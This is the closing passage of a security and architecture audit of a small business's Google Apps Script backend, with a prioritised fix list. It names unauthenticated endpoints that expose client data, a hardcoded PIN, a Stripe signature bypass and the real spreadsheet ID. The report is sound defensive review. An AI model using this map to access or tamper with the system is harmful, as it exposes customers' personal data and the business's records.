| **Field Notes** | Dynamic | Dynamic |
| **Job Tracking** | Dynamic | Dynamic |

### 🟡 SH-01: Column Index Hardcoding
Throughout the code, columns are accessed by numeric index (e.g., `data[i][19]` for job number, `data[i][3]` for email). If headers are ever reordered, the entire system breaks silently.

**Fix:** Build a header-to-index map at the start of each function: `var colMap = {}; headers.forEach(function(h, i) { colMap[h.toString().trim()] = i; });`

---

## 10. SCALABILITY CONCERNS

### 🟠 SC-01: Full Sheet Scans on Every Request
**Lines:** 60+ occurrences of `getDataRange().getValues()`  
Every GET request reads the ENTIRE sheet into memory. At 10,000 rows × 21 columns in the Jobs sheet, this is ~210,000 cell reads per request.

**GAS Limits:**
- Script execution timeout: 6 minutes (web app), 30 minutes (triggers)
- UrlFetch timeout: 60 seconds
- Spreadsheet data: ~10MB per read

At 10,000+ rows, `getClients()` returns a JSON payload of ~5-10MB. GAS has a ~50MB content service limit, but network latency makes large payloads impractical.

**Mitigation strategies:**
1. Add pagination: `?limit=100&offset=200`
2. Add date filtering: `?since=2026-01-01`
3. Cache recent data in PropertiesService (6KB limit per property, 500KB total)
4. The Supabase dual-write layer is the correct long-term solution — use it for reads too

### 🟠 SC-02: appendRow() Performance
**Lines:** 50+ occurrences  
`appendRow()` is one of the slowest GAS operations (~500ms per call). Under concurrent load (e.g., 10 bookings in quick succession), this creates a bottleneck.

**Fix:** Batch writes using `sheet.getRange(nextRow, 1, rows.length, cols).setValues(rowsArray)`.

### 🟡 SC-03: Site Analytics Sheet Will Grow Unbounded
**Line:** 2836  
Every page view appends a row. At 100 views/day, this sheet will have 36,500 rows per year. No cleanup/archival mechanism exists.

**Fix:** Add a monthly archive trigger that summarises old analytics and clears the raw data.

### 🟡 SC-04: Email Tracking Sheet Will Grow Unbounded
Similar to analytics — every email sent adds a row. With lifecycle emails for all clients, this grows fast.

---

## 11. ADDITIONAL FINDINGS

### ℹ️ A-01: Two Code.gs Files — Version Drift
`apps-script/Code.gs` (22,137 lines) is 2,374 lines ahead of `gas/Code.gs` (19,762 lines). The `gas/` directory appears to be a stale copy.

**Fix:** Either symlink them or delete one. Having two divergent copies of the most critical file is dangerous.

### ℹ️ A-02: Spreadsheet ID Hardcoded in Multiple Places
The `SPREADSHEET_ID` constant is defined at line 35, but many functions hardcode the same ID directly:
```javascript
SpreadsheetApp.openById('1_Y7yHIpAvv_VNBhTrwNOQaBMAGa3UlVW_FKlf56ouHk')
```
This appears in 50+ locations instead of using the `SPREADSHEET_ID` variable.

**Fix:** Replace all hardcoded IDs with `SPREADSHEET_ID`.

### ℹ️ A-03: Global Variable Initialisation Cost
**Lines:** 1256-1264  
`TG_BOT_TOKEN`, `TG_CHAT_ID`, and `BOT_TOKENS` are initialised at file scope, meaning `PropertiesService.getScriptProperties()` is called on EVERY request even if the function doesn't need Telegram.

**Fix:** Lazy-load these values inside the functions that use them.

### 🟢 A-04: Supabase Dual-Write — Good Architecture
The `mirrorActionToSupabase()` pattern (L887) is well-designed:
- Fire-and-forget (never blocks main flow)
- Comprehensive error logging
- Covers all major data types
- Uses upsert with conflict resolution

This is the correct path toward replacing Google Sheets as the primary datastore.

### 🟢 A-05: Booking Lock — Well Implemented
**Lines:** 2276-2324  
The booking flow uses `LockService.getScriptLock()` with `waitLock(10000)` and a `finally` block for guaranteed release. The availability check happens inside the lock. ✅ Correct.

### 🟢 A-06: Email System — Resilient
The `sendEmail()` function (L1106) has retry logic, error logging, and Telegram alerting on failure. The explicit throw on failure ensures callers know when emails fail.

### 🟢 A-07: GDPR Delete — Comprehensive
`deleteCustomerAccount()` (L12076) properly:
- Requires session authentication
- Requires typed confirmation phrase
- Anonymises Jobs (preserves financial records)
- Deletes from Subscribers, Email Preferences, Schedule
- Invalidates all auth tokens
- Anonymises Email Tracking
- Sends audit notification to Telegram

---

## PRIORITY FIX LIST

### Immediate (Sprint 1 — This Week)

| # | Issue | Fix | Impact |
|---|-------|-----|--------|
| 1 | **S-01** | Add `isAdminAuthed()` to: `update_client`, `update_status`, `sheet_write`, `sheet_read`, `send_newsletter`, `cancel_booking`, `mark_invoice_paid`, `send_email`, `save_business_costs`, `save_blog_post`, `send_completion_email`, `relay_telegram*` | Prevents data tampering and email abuse |
| 2 | **S-02** | Add `isAdminAuthed()` via query param check to: `get_clients`, `get_invoices`, `get_subscribers`, `get_business_costs`, `sheet_read`, `get_enquiries`, `get_orders`, `get_applications`, `get_complaints` | Prevents PII exposure |
| 3 | **S-03** | Move `MOBILE_PIN` to Script Properties | Eliminates hardcoded credential |
| 4 | **S-05** | Change Stripe signature bypass to reject: `if (!secret) return false;` | Prevents fake payment events |

### Short-term (Sprint 2 — Next 2 Weeks)

| # | Issue | Fix |
|---|-------|-----|
| 5 | **C-01** | Add LockService to `cancelBooking`, `sendNewsletter`, `saveBlogPost`, `subscribeNewsletter` |
| 6 | **S-08** | Add formula injection guard to all user-input appendRow calls |
| 7 | **A-01** | Delete `gas/Code.gs` or sync with `apps-script/Code.gs` |
| 8 | **SC-01** | Add pagination to `getClients`, `getInvoices`, `getEnquiries` |

### Medium-term (Sprint 3-4 — Next Month)

| # | Issue | Fix |
|---|-------|-----|
| 9 | **SH-01** | Refactor column access from indices to header-based lookup |
| 10 | **A-02** | Replace all hardcoded spreadsheet IDs with `SPREADSHEET_ID` |
| 11 | **F-02** | Add Xero-compatible fields to Invoices sheet |
| 12 | **SC-03** | Add analytics archival trigger |
| 13 | **A-03** | Lazy-load Telegram tokens |

---

## SUMMARY STATISTICS

| Metric | Value |
|--------|-------|
| Total lines | 22,137 |
| doPost actions | ~92 |
| doGet actions | ~62 |
| Actions with admin auth | 15 (16%) |
| Actions that NEED admin auth | ~45 |
| Email-sending functions | 22 |
| LockService usage points | 7 |
| Operations needing locks | 15+ |
| Sheet-level full scans | 60+ |
| Cloud triggers | 12 |
| Hardcoded spreadsheet IDs | 50+ |
| Supabase mirrored actions | 15 |

**Overall Assessment:** The GAS middleware is impressively comprehensive for a solo developer project. The core payment flows (Stripe, invoicing) are well-implemented with proper locking and error handling. The primary risk is the **wide-open API surface** — the majority of endpoints accept unauthenticated requests, exposing all business data and allowing arbitrary modifications. This is the #1 priority fix.
